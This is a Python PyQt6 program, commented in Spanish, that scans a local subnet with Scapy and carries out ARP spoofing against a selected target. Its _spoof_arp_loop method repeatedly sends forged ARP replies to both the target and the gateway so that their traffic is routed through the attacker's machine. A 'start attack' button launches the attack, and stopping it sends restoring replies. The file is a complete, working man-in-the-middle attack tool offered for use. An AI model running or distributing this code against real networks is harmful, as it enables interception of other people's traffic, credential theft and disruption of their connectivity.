import os
import sys
import re
import socket
import ipaddress
import time
import threading
import uuid

# Importaciones de PyQt6
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit,
    QTableWidget, QTableWidgetItem, QHeaderView,
    QGroupBox, QSizePolicy, QSpacerItem, QMessageBox, QStyle
)
from PyQt6.QtGui import QIcon, QPalette, QColor, QTextCharFormat, QTextCursor, QFont # QFont podría no ser necesaria si no hay más cambios de fuente
from PyQt6.QtCore import Qt, QSize, QPropertyAnimation, QEasingCurve, QTimer, QCoreApplication, QObject, pyqtSignal, QSettings

# Intentar importar Scapy y manejar la dependencia (se verifica de nuevo al final)
try:
    from scapy.all import ARP, Ether, send, srp
except ImportError:
    pass

# --- CONSTANTES GLOBALES (para configuración y rutas de archivos) ---
CONFIG_ORG_NAME = "MiEmpresa"
CONFIG_APP_NAME = "ARPSpoofer"
# MODIFICACIÓN: Eliminada CONFIG_ZOOM_KEY ya que la funcionalidad de zoom se ha removido.

DATA_DIR = "data"
OU_FILE = os.path.join(DATA_DIR, "ou.txt") 
OUI_DATABASE_FILE = os.path.join(DATA_DIR, "oui.txt")

# --- MODELO (Lógica de Negocio y Datos) ---
class ARPSpooferModel(QObject):
    """
    Modelo en la arquitectura MVC. Contiene la lógica de negocio,
    la gestión de datos y las operaciones de red.
    """
    logMessage = pyqtSignal(str, str) 
    statusMessage = pyqtSignal(str, str)
    devicesUpdated = pyqtSignal(list)
    scanButtonState = pyqtSignal(bool)
    startButtonState = pyqtSignal(bool)
    stopButtonState = pyqtSignal(bool)
    adminStatusChanged = pyqtSignal(bool) 
    
    # MODIFICACIÓN: Eliminadas constantes ZOOM_LEVELS y DEFAULT_ZOOM_INDEX.

    def __init__(self):
        super().__init__()
        self.ip_gateway = None
        self.mac_attacker = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
        self.attack_in_progress = False
        self.spoof_thread = None
        self.discovered_devices = [] 
        self.oui_database = {}

        self.target_ip_cache = None
        self.target_mac_cache = None
        self.gateway_mac_cache = None

        os.makedirs(DATA_DIR, exist_ok=True)
        
        # MODIFICACIÓN: Eliminada la llamada a _load_configuration ya que solo manejaba el zoom.
        # Si hubiera otras configuraciones, se mantendría.
        # self._load_configuration() 
        self.statusMessage.emit("Estado: Configuración inicial omitida (zoom removido)", "blue")


        self._load_oui_database() 
        self._initialize_network_info() 
        self._load_devices_from_file() 
        self._check_admin_privileges()

    # MODIFICACIÓN: Eliminado _check_admin_privileges y su lógica.
    def _check_admin_privileges(self):
        is_admin = False
        if sys.platform.startswith('win'): 
            try:
                import ctypes
                is_admin = (ctypes.windll.shell32.IsUserAnAdmin() != 0)
            except Exception as e:
                self.logMessage.emit(f"Error al verificar privilegios de administrador en Windows: {e}", "red")
        else: 
            try:
                is_admin = (os.geteuid() == 0)
            except AttributeError: 
                 self.logMessage.emit(f"No se pudo verificar privilegios de root (os.geteuid no disponible). Asumiendo no-root.", "orange")
            except Exception as e:
                self.logMessage.emit(f"Error al verificar privilegios de root: {e}", "red")
        
        if is_admin:
            self.logMessage.emit("Ejecutando con privilegios de administrador/root.", "green")
        else:
            self.logMessage.emit("Advertencia: No se están ejecutando con privilegios de administrador/root. Algunas funciones pueden fallar o estar limitadas.", "orange")
        self.adminStatusChanged.emit(is_admin)

    # MODIFICACIÓN: Eliminados _load_configuration y _save_configuration, ya que solo gestionaban el zoom.
    # Si gestionaran otras configuraciones, se deberían ajustar.

    # MODIFICACIÓN: Eliminados get_current_zoom_percentage, zoom_in, zoom_out.

    def _is_valid_ip(self, ip):
        try:
            ipaddress.IPv4Address(ip)
            return True
        except ipaddress.AddressValueError:
            return False

    def _get_mac(self, ip):
        if 'scapy' not in sys.modules: return None 
        try:
            arp_request = ARP(pdst=ip)
            ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") 
            packet = ether_frame / arp_request
            result = srp(packet, timeout=1, verbose=0)[0] 
            for sent, received in result:
                return received.hwsrc 
            return None 
        except Exception as e:
            self.logMessage.emit(f"Error al obtener MAC para {ip}: {e}", "red")
            return None

    def _get_gateway_ip(self):
        try:
            if sys.platform.startswith('win'): 
                output = os.popen('route print').read()
                match = re.search(r'\s+0\.0\.0\.0\s+0\.0\.0\.0\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                if match: return match.group(1)
                match = re.search(r'Default Gateway:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                if match: return match.group(1)
            else: 
                output = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
                if output: return output
                output = os.popen("netstat -rn | grep default | awk '{print $2}'").read().strip()
                if output: return output
            self.logMessage.emit("No se pudo determinar la puerta de enlace automáticamente.", "orange")
            return None
        except Exception as e:
            self.logMessage.emit(f"Error al obtener puerta de enlace: {e}", "red")
            return None

    def _get_local_ip_and_subnet(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1) 
            s.connect(("8.8.8.8", 80)) 
            local_ip = s.getsockname()[0]
            s.close() 
            network = ipaddress.ip_network(f"{local_ip}/24", strict=False) 
            return str(network.network_address), str(network.prefixlen)
        except socket.error: 
            self.logMessage.emit(f"Error de red al obtener IP local. Verifique conexión.", "orange")
            return None, None
        except Exception as e:
            self.logMessage.emit(f"Error al obtener IP local y subred: {e}", "orange")
            return None, None

    def _resolve_hostname(self, ip):
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            return hostname
        except socket.herror: 
            return "N/A" 
        except Exception: 
            return "Error" 

    def _load_oui_database(self):
        self.oui_database = {}
        if os.path.exists(OUI_DATABASE_FILE):
            self.logMessage.emit(f"Cargando base de datos OUI desde {OUI_DATABASE_FILE}...", "blue")
            try:
                with open(OUI_DATABASE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        match = re.match(r'^([0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2})\s+\(hex\)\s+(.+)', line, re.IGNORECASE)
                        if match:
                            oui_prefix = match.group(1).replace('-', '').upper() 
                            organization = match.group(2).strip()
                            self.oui_database[oui_prefix] = organization
                self.logMessage.emit(f"Cargadas {len(self.oui_database)} entradas OUI.", "green")
            except Exception as e:
                self.logMessage.emit(f"Error al cargar la base de datos OUI: {e}", "red")
        else:
            self.logMessage.emit(f"Archivo OUI '{OUI_DATABASE_FILE}' no encontrado. La identificación de fabricante no estará disponible.", "orange")

    def _get_vendor(self, mac_address):
        if not mac_address or len(mac_address) < 8: 
            return "Inválido"
        mac_prefix = mac_address.replace(':', '').replace('-', '').upper()[:6] 
        return self.oui_database.get(mac_prefix, "Desconocido") 

    def _load_devices_from_file(self):
        self.discovered_devices = []
        if os.path.exists(OU_FILE):
            self.logMessage.emit(f"Cargando dispositivos conocidos desde {OU_FILE}...", "blue")
            try:
                with open(OU_FILE, 'r', encoding='utf-8') as f:
                    for line in f:
                        parts = line.strip().split(',')
                        if len(parts) == 4: 
                            ip, mac, hostname, vendor = parts
                        elif len(parts) == 3: 
                            ip, mac, hostname = parts
                            vendor = "N/A (Antiguo)" 
                        else:
                            self.logMessage.emit(f"Línea mal formada en {OU_FILE}: {line.strip()}", "orange")
                            continue

                        if self._is_valid_ip(ip):
                            self.discovered_devices.append({'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor})
                self.devicesUpdated.emit(self.discovered_devices) 
                self.logMessage.emit(f"Cargados {len(self.discovered_devices)} dispositivos desde {OU_FILE}.", "green")
            except Exception as e:
                self.logMessage.emit(f"Error al cargar dispositivos desde {OU_FILE}: {e}", "red")
        else:
            self.logMessage.emit(f"Archivo de dispositivos '{OU_FILE}' no encontrado. Se creará al escanear.", "orange")

    def _save_devices_to_file(self):
        try:
            with open(OU_FILE, 'w', encoding='utf-8') as f:
                for device in self.discovered_devices:
                    ip = device.get('ip', 'N/A')
                    mac = device.get('mac', 'N/A')
                    hostname = device.get('hostname', 'N/A')
                    vendor = device.get('vendor', 'Desconocido')
                    f.write(f"{ip},{mac},{hostname},{vendor}\n")
            self.logMessage.emit(f"Dispositivos guardados en {OU_FILE}.", "green")
        except Exception as e:
            self.logMessage.emit(f"Error al guardar dispositivos en {OU_FILE}: {e}", "red")

    def _initialize_network_info(self):
        self.logMessage.emit("Obteniendo información de red inicial...", "blue")
        self.statusMessage.emit("Estado: Inicializando red...", "blue")
        try:
            self.ip_gateway = self._get_gateway_ip()
            if self.ip_gateway:
                self.logMessage.emit(f"Puerta de enlace detectada: {self.ip_gateway}", "green")
                self.statusMessage.emit("Estado: Puerta de enlace detectada", "green")
            else:
                self.logMessage.emit("Error: No se pudo obtener la IP de la puerta de enlace. Verifique su conexión de red o permisos.", "red")
                self.statusMessage.emit("Estado: Error de red - Puerta de enlace no encontrada", "red")
                self.startButtonState.emit(False) 
                self.scanButtonState.emit(False) 

            local_ip_base, subnet_prefix = self._get_local_ip_and_subnet()
            if local_ip_base and subnet_prefix:
                self.logMessage.emit(f"Subred local detectada para escaneo: {local_ip_base}/{subnet_prefix}", "cyan_highlight") 
                self.subnet_to_set = f"{local_ip_base}/{subnet_prefix}" 
            else:
                self.logMessage.emit("No se pudo detectar automáticamente la IP local/subred. Ingrese manualmente para escanear.", "orange")
                self.subnet_to_set = "" 

        except Exception as e:
            self.logMessage.emit(f"Error fatal al inicializar información de red: {e}", "red")
            self.statusMessage.emit("Estado: Error crítico de inicialización de red", "red")
            self.startButtonState.emit(False)
            self.scanButtonState.emit(False)
            self.subnet_to_set = ""

    def start_scan_network(self, subnet):
        if 'scapy' not in sys.modules:
            self.logMessage.emit("Scapy no está disponible. No se puede escanear.", "red")
            return False
            
        if not subnet: 
            self.logMessage.emit("Advertencia: Por favor, ingrese una subred para escanear (ej. 192.168.1.0/24).", "orange")
            self.statusMessage.emit("Estado: Escaneo fallido - subred no especificada", "orange")
            return False

        try: 
            ipaddress.ip_network(subnet, strict=False)
        except ValueError:
            self.logMessage.emit(f"Advertencia: La subred ingresada '{subnet}' no es válida. Use el formato X.X.X.X/YY.", "orange")
            self.statusMessage.emit("Estado: Escaneo fallido - subred con formato incorrecto", "orange")
            return False

        self.logMessage.emit(f"Iniciando escaneo de red en {subnet}...", "blue")
        self.statusMessage.emit("Estado: Escaneando...", "blue")
        self.scanButtonState.emit(False) 

        scan_thread = threading.Thread(target=self._scan_network_async, args=(subnet,), daemon=True)
        scan_thread.start()
        return True

    def _scan_network_async(self, subnet):
        newly_discovered_devices_count = 0
        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=3, verbose=0)
            
            for sent, received in ans:
                ip = received.psrc
                mac = received.hwsrc
                hostname = self._resolve_hostname(ip)
                vendor = self._get_vendor(mac) 

                device_info = {'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor}
                
                found = False
                for i, existing_device in enumerate(self.discovered_devices):
                    if existing_device['ip'] == ip:
                        self.discovered_devices[i] = device_info 
                        found = True
                        break
                if not found:
                    self.discovered_devices.append(device_info) 
                
                self.logMessage.emit(f"Descubierto: IP {ip} | MAC {mac} | Hostname {hostname} | Fabricante {vendor}", "purple")
                self.devicesUpdated.emit(list(self.discovered_devices)) 
                newly_discovered_devices_count +=1

            self.logMessage.emit(f"Escaneo completado. Descubiertos/actualizados {newly_discovered_devices_count} dispositivos activos en este escaneo.", "green")
            self.statusMessage.emit("Estado: Escaneo completado", "green")
            self._save_devices_to_file() 
        except Exception as e:
            self.logMessage.emit(f"Error durante el escaneo de red: {e}", "red")
            self.statusMessage.emit("Estado: Error durante el escaneo", "red")
        finally:
            self.scanButtonState.emit(True) 

    def start_arp_spoofing(self, target_ip):
        if 'scapy' not in sys.modules:
            self.logMessage.emit("Scapy no está disponible. No se puede iniciar el ataque.", "red")
            return False

        if not target_ip:
            self.logMessage.emit("Advertencia: Por favor, ingrese una dirección IP objetivo.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo vacía", "orange")
            return False
        if not self._is_valid_ip(target_ip):
            self.logMessage.emit(f"Advertencia: La IP objetivo '{target_ip}' ingresada no es válida.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo no válida", "orange")
            return False
        if not self.ip_gateway:
            self.logMessage.emit("Error: No se pudo obtener la IP de la puerta de enlace. No se puede iniciar el ataque.", "red")
            self.statusMessage.emit("Estado: Ataque fallido - Puerta de enlace no disponible", "red")
            return False
        if target_ip == self.ip_gateway:
            self.logMessage.emit("Advertencia: La IP objetivo no puede ser la misma que la puerta de enlace.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo es la puerta de enlace", "orange")
            return False
        
        local_ip_base, _ = self._get_local_ip_and_subnet()
        if target_ip == local_ip_base: 
            self.logMessage.emit("Advertencia: La IP objetivo no puede ser la IP de su propio equipo.", "orange")
            self.statusMessage.emit("Estado: Ataque fallido - IP objetivo es el atacante", "orange")
            return False

        self.logMessage.emit("Iniciando ataque ARP Spoofing...", "blue")
        self.statusMessage.emit("Estado: Iniciando ataque...", "blue")
        self.startButtonState.emit(False) 
        self.stopButtonState.emit(True)  

        def prepare_and_start_async():
            target_mac = self._get_mac(target_ip)
            if not target_mac:
                self.logMessage.emit(f"No se pudo obtener la dirección MAC del objetivo {target_ip}. Ataque cancelado.", "red")
                self.statusMessage.emit("Estado: Fallo al obtener MAC objetivo", "red")
                self.attack_in_progress = False 
                self.startButtonState.emit(True)
                self.stopButtonState.emit(False)
                return

            gateway_mac = self._get_mac(self.ip_gateway)
            if not gateway_mac:
                self.logMessage.emit(f"No se pudo obtener la dirección MAC de la puerta de enlace {self.ip_gateway}. Ataque cancelado.", "red")
                self.statusMessage.emit("Estado: Fallo al obtener MAC puerta de enlace", "red")
                self.attack_in_progress = False
                self.startButtonState.emit(True)
                self.stopButtonState.emit(False)
                return

            self.target_ip_cache = target_ip
            self.target_mac_cache = target_mac
            self.gateway_mac_cache = gateway_mac
            self.logMessage.emit(f"MAC del atacante: {self.mac_attacker}", "purple")
            self.logMessage.emit(f"MAC del objetivo ({target_ip}): {target_mac}", "purple")
            self.logMessage.emit(f"MAC de la puerta de enlace ({self.ip_gateway}): {gateway_mac}", "purple")

            self.attack_in_progress = True
            self.spoof_thread = threading.Thread(target=self._spoof_arp_loop, args=(target_ip, target_mac, self.ip_gateway, gateway_mac), daemon=True)
            self.spoof_thread.start()
            self.logMessage.emit("Ataque ARP Spoofing en curso...", "green")
            self.statusMessage.emit("Estado: Atacando...", "green")
        
        threading.Thread(target=prepare_and_start_async, daemon=True).start()
        return True

    def _spoof_arp_loop(self, target_ip, target_mac, gateway_ip, gateway_mac):
        try:
            arp_response_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=self.mac_attacker, op=2) 
            arp_response_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=self.mac_attacker, op=2)

            while self.attack_in_progress: 
                send(arp_response_target, verbose=0)
                send(arp_response_gateway, verbose=0)
                time.sleep(2) 
        except Exception as e:
            self.logMessage.emit(f"Ocurrió un error durante el spoofing: {e}. Deteniendo ataque.", "red")
            self.statusMessage.emit("Estado: Error durante el spoofing", "red")
        finally:
            if self.attack_in_progress: 
                 self.attack_in_progress = False 
                 QCoreApplication.instance().callLater(self.stop_arp_spoofing)


    def stop_arp_spoofing(self):
        if self.attack_in_progress:
            self.logMessage.emit("Solicitud de detención recibida... Deteniendo ataque.", "blue")
            self.statusMessage.emit("Estado: Deteniendo ataque...", "blue")
            self.attack_in_progress = False 
            
            if self.spoof_thread and self.spoof_thread.is_alive():
                self.spoof_thread.join(timeout=1.0) 

            if self.target_ip_cache and self.ip_gateway and self.target_mac_cache and self.gateway_mac_cache:
                self.logMessage.emit("Intentando restaurar la conexión ARP...", "blue")
                threading.Thread(target=self._restore_connection_async,
                                 args=(self.target_ip_cache, self.target_mac_cache,
                                       self.ip_gateway, self.gateway_mac_cache),
                                 daemon=True).start()
            else:
                self.logMessage.emit("No se puede restaurar la conexión ARP: información MAC/IP no disponible en caché.", "orange")
        else:
            self.logMessage.emit("El ataque no está en curso.", "orange")
        
        self.statusMessage.emit("Estado: Inactivo", "black")
        self.startButtonState.emit(True)
        self.stopButtonState.emit(False)
        self.target_ip_cache = None
        self.target_mac_cache = None
        self.gateway_mac_cache = None


    def _restore_connection_async(self, target_ip, target_mac, gateway_ip, gateway_mac):
        if 'scapy' not in sys.modules: return
        try:
            arp_restore_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
            arp_restore_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac, op=2)

            send(arp_restore_target, count=5, verbose=0, inter=0.2)
            send(arp_restore_gateway, count=5, verbose=0, inter=0.2)
            self.logMessage.emit("Conexión ARP restaurada exitosamente.", "green")
            self.statusMessage.emit("Estado: Conexión restaurada", "green")
        except Exception as e:
            self.logMessage.emit(f"Error al restaurar la conexión ARP: {e}", "red")
            self.statusMessage.emit("Estado: Error al restaurar conexión ARP", "red")

# --- VISTA (Interfaz de Usuario) ---
class ARPSpooferView(QMainWindow):
    def __init__(self, controller):
        super().__init__()
        self.controller = controller 
        self.setWindowTitle("Herramienta de ARP Spoofing y Escáner de Red")
        self.setMinimumSize(800, 600) 

        self._apply_theme() 
        self._setup_ui() 

    def _apply_theme(self):
        palette = self.palette() 
        palette.setColor(QPalette.ColorRole.Window, QColor(240, 240, 240)) 
        palette.setColor(QPalette.ColorRole.WindowText, QColor(50, 50, 50)) 
        self.setPalette(palette)

        # MODIFICACIÓN: La fuente ahora será la global de la aplicación, sin ajustes específicos por zoom aquí.
        # El CSS para QPushButton ya no necesita el comentario sobre 'font-size' removido,
        # ya que la funcionalidad de zoom que lo requería ha sido eliminada.
        self.setStyleSheet("""
            QPushButton {
                border: 2px solid #8f8f91;
                border-radius: 5px;
                padding: 8px 15px;
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 #f6f7fa, stop: 1 #dadbde);
                font-weight: bold; /* El tamaño de la fuente será el por defecto o el global de QApplication */
            }
            QPushButton:hover {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                            stop: 0 #dadbde, stop: 1 #f6f7fa);
            }
            QPushButton:pressed { background: #c0c0c0; }
            QPushButton:disabled { background: #e0e0e0; color: #a0a0a0; }
            #startButton { background-color: #4CAF50; color: white; }
            #startButton:hover { background-color: #45a049; }
            #stopButton { background-color: #f44336; color: white; }
            #stopButton:hover { background-color: #da190b; }
            #scanButton { background-color: #2196F3; color: white; }
            #scanButton:hover { background-color: #0b7dda; }
            QGroupBox { font-weight: bold; border: 1px solid gray; border-radius: 5px; margin-top: 1ex; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top center; padding: 0 3px; background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #f0f0f0, stop:1 #e0e0e0); }
            QTableWidget { alternate-background-color: #f5f5f5; gridline-color: #ccc; }
            QTableWidget::item:selected { background-color: #a0c0e0; }
            QHeaderView::section { background-color: #d0d0d0; padding: 4px; border-bottom: 1px solid #c0c0c0; font-weight: bold; }
            #adminWarningLabel {
                color: red;
                font-style: italic;
                font-weight: normal; 
                padding: 5px;
                border: 1px solid #ffaaaa;
                background-color: #ffeeee;
                border-radius: 3px;
            }
        """)

    def _setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        spoof_group_box = QGroupBox("ARP Spoofing")
        spoof_layout = QVBoxLayout(spoof_group_box)
        main_layout.addWidget(spoof_group_box)

        target_ip_layout = QHBoxLayout()
        target_ip_label = QLabel("IP Objetivo:")
        target_ip_layout.addWidget(target_ip_label)
        self.target_ip_entry = QLineEdit()
        self.target_ip_entry.setPlaceholderText("Ej: 192.168.1.100")
        target_ip_layout.addWidget(self.target_ip_entry)
        spoof_layout.addLayout(target_ip_layout)

        spoof_buttons_layout = QHBoxLayout()
        self.start_button = QPushButton("Iniciar Ataque")
        self.start_button.setObjectName("startButton") 
        self.start_button.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_MediaPlay)) 
        self.start_button.clicked.connect(self._on_start_button_clicked)
        spoof_buttons_layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Detener Ataque")
        self.stop_button.setObjectName("stopButton")
        self.stop_button.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_MediaStop))
        self.stop_button.clicked.connect(self._on_stop_button_clicked)
        self.stop_button.setEnabled(False) 
        spoof_buttons_layout.addWidget(self.stop_button)
        spoof_layout.addLayout(spoof_buttons_layout)

        scanner_group_box = QGroupBox("Escáner de Red")
        scanner_layout = QVBoxLayout(scanner_group_box)
        main_layout.addWidget(scanner_group_box)

        subnet_scan_layout = QHBoxLayout()
        subnet_label = QLabel("Subred (CIDR):")
        subnet_scan_layout.addWidget(subnet_label)
        self.subnet_entry = QLineEdit()
        self.subnet_entry.setPlaceholderText("Ej: 192.168.1.0/24")
        subnet_scan_layout.addWidget(self.subnet_entry)

        self.scan_button = QPushButton("Escanear Red")
        self.scan_button.setObjectName("scanButton")
        self.scan_button.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_BrowserReload))
        self.scan_button.clicked.connect(self._on_scan_button_clicked)
        subnet_scan_layout.addWidget(self.scan_button)
        scanner_layout.addLayout(subnet_scan_layout)

        self.device_table = QTableWidget()
        self.device_table.setColumnCount(4) 
        self.device_table.setHorizontalHeaderLabels(["Dirección IP", "Dirección MAC", "Hostname", "Fabricante"])
        for i in range(4):
            self.device_table.horizontalHeader().setSectionResizeMode(i, QHeaderView.ResizeMode.Stretch)
        self.device_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows) 
        self.device_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection) 
        self.device_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers) 
        self.device_table.itemSelectionChanged.connect(self._on_device_selected) 
        scanner_layout.addWidget(self.device_table)

        output_group_box = QGroupBox("Log de Eventos y Estado")
        output_layout = QVBoxLayout(output_group_box)
        main_layout.addWidget(output_group_box)

        self.output_text_edit = QTextEdit() 
        self.output_text_edit.setReadOnly(True)
        output_layout.addWidget(self.output_text_edit)

        self.status_label = QLabel("Estado: Listo")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setStyleSheet("font-weight: bold; padding: 5px; border: 1px solid #ccc; border-radius: 3px; background-color: #e9e9e9;")
        output_layout.addWidget(self.status_label)
        
        # MODIFICACIÓN: Eliminados los botones de zoom y el layout de zoom.
        # zoom_layout = QHBoxLayout()
        # ... (creación de self.zoom_out_button y self.zoom_in_button)
        # main_layout.addLayout(zoom_layout)

        self.admin_warning_label = QLabel("Advertencia: Este programa requiere privilegios de superusuario (root/administrador) para funcionar correctamente.")
        self.admin_warning_label.setObjectName("adminWarningLabel") 
        self.admin_warning_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.admin_warning_label.setWordWrap(True)
        self.admin_warning_label.setVisible(False) 
        main_layout.addWidget(self.admin_warning_label)

    def _on_start_button_clicked(self):
        target_ip = self.target_ip_entry.text().strip()
        self.controller.start_spoofing(target_ip)

    def _on_stop_button_clicked(self):
        self.controller.stop_spoofing()

    def _on_scan_button_clicked(self):
        subnet = self.subnet_entry.text().strip()
        self.controller.start_scan(subnet)

    def _on_device_selected(self):
        selected_items = self.device_table.selectedItems()
        if selected_items:
            row = selected_items[0].row()
            ip_item = self.device_table.item(row, 0) 
            if ip_item:
                selected_ip = ip_item.text()
                self.target_ip_entry.setText(selected_ip) 
                self.controller.log_message(f"IP objetivo '{selected_ip}' seleccionada de la tabla.", "blue")

    # MODIFICACIÓN: Eliminados _on_zoom_in_clicked y _on_zoom_out_clicked.

    def update_log_message(self, message, color_name):
        color_map = {
            "black": QColor(0, 0, 0), "red": QColor(200, 0, 0), "green": QColor(0, 150, 0),
            "blue": QColor(0, 0, 200), "purple": QColor(128, 0, 128), "orange": QColor(255, 128, 0),
            "cyan_highlight": QColor(0, 190, 190) 
        }
        color = color_map.get(color_name.lower(), QColor(0, 0, 0)) 

        self.output_text_edit.moveCursor(QTextCursor.MoveOperation.End) 
        char_format = QTextCharFormat()
        char_format.setForeground(color)
        self.output_text_edit.setCurrentCharFormat(char_format)
        self.output_text_edit.insertPlainText(message + "\n") 
        self.output_text_edit.ensureCursorVisible() 

    def update_status_message(self, text, color_name):
        color_map = { "black": "black", "red": "red", "green": "green", "blue": "blue", "orange": "orange" }
        text_color = color_map.get(color_name.lower(), "black")
        self.status_label.setText(text)
        self.status_label.setStyleSheet(f"font-weight: bold; padding: 5px; border: 1px solid #ccc; border-radius: 3px; color: {text_color}; background-color: #e9e9e9;")

    def update_device_table(self, devices):
        self.device_table.setRowCount(0) 
        for row_idx, device_info in enumerate(devices):
            self.device_table.insertRow(row_idx)
            self.device_table.setItem(row_idx, 0, QTableWidgetItem(device_info.get('ip', 'N/A')))
            self.device_table.setItem(row_idx, 1, QTableWidgetItem(device_info.get('mac', 'N/A')))
            self.device_table.setItem(row_idx, 2, QTableWidgetItem(device_info.get('hostname', 'N/A')))
            self.device_table.setItem(row_idx, 3, QTableWidgetItem(device_info.get('vendor', 'Desconocido')))

    def set_scan_button_state(self, enabled):
        self.scan_button.setEnabled(enabled)

    def set_start_button_state(self, enabled):
        self.start_button.setEnabled(enabled)

    def set_stop_button_state(self, enabled):
        self.stop_button.setEnabled(enabled)

    def set_subnet_entry_text(self, text):
        self.subnet_entry.setText(text)

    # MODIFICACIÓN: Eliminado apply_zoom_factor.
    # La fuente de la aplicación será ahora la fuente por defecto del sistema o la establecida globalmente
    # por QApplication si se hiciera en otro lugar, pero ya no se gestiona un zoom dinámico.

    def set_admin_warning_visibility(self, is_admin):
        self.admin_warning_label.setVisible(not is_admin) 


# --- CONTROLADOR (Mediador) ---
class ARPSpooferController:
    def __init__(self):
        self.model = ARPSpooferModel() 
        self.view = ARPSpooferView(self) 
        
        self.model.logMessage.connect(self.view.update_log_message)
        self.model.statusMessage.connect(self.view.update_status_message)
        self.model.devicesUpdated.connect(self.view.update_device_table)
        self.model.scanButtonState.connect(self.view.set_scan_button_state)
        self.model.startButtonState.connect(self.view.set_start_button_state)
        self.model.stopButtonState.connect(self.view.set_stop_button_state)
        self.model.adminStatusChanged.connect(self.view.set_admin_warning_visibility)

        self.view.set_subnet_entry_text(self.model.subnet_to_set)
        self.view.set_start_button_state(True) 
        self.view.set_scan_button_state(True) 
        
        # MODIFICACIÓN: Eliminada la llamada a self.apply_zoom(None) ya que el zoom se ha removido.

    def start_spoofing(self, target_ip):
        self.model.start_arp_spoofing(target_ip)

    def stop_spoofing(self): 
        self.model.stop_arp_spoofing()

    def start_scan(self, subnet):
        self.model.start_scan_network(subnet)

    def log_message(self, message, color): 
        self.view.update_log_message(message, color)

    # MODIFICACIÓN: Eliminado el método apply_zoom.

    def show_view(self):
        self.view.show()
        self.model.statusMessage.emit("Estado: Listo. Esperando acción.", "black")


# --- PUNTO DE ENTRADA PRINCIPAL ---
def main():
    app = QApplication(sys.argv)
    os.makedirs(DATA_DIR, exist_ok=True)
    controller = ARPSpooferController()
    controller.show_view() 
    sys.exit(app.exec())

if __name__ == "__main__":
    try:
        import scapy.all
    except ImportError:
        temp_app_for_error_msg = QApplication.instance() 
        if temp_app_for_error_msg is None:
            temp_app_for_error_msg = QApplication(sys.argv)
            
        msg_box = QMessageBox()
        msg_box.setIcon(QMessageBox.Icon.Critical)
        msg_box.setText("Error de Dependencia Crítica")
        msg_box.setInformativeText("La librería 'scapy' no está instalada, y es esencial para esta aplicación.\n\nPor favor, instálela ejecutando:\n   pip install scapy\n\nLuego, intente ejecutar la aplicación nuevamente.")
        msg_box.setWindowTitle("Error: Scapy no encontrado")
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        msg_box.exec()
        sys.exit(1) 

    main()
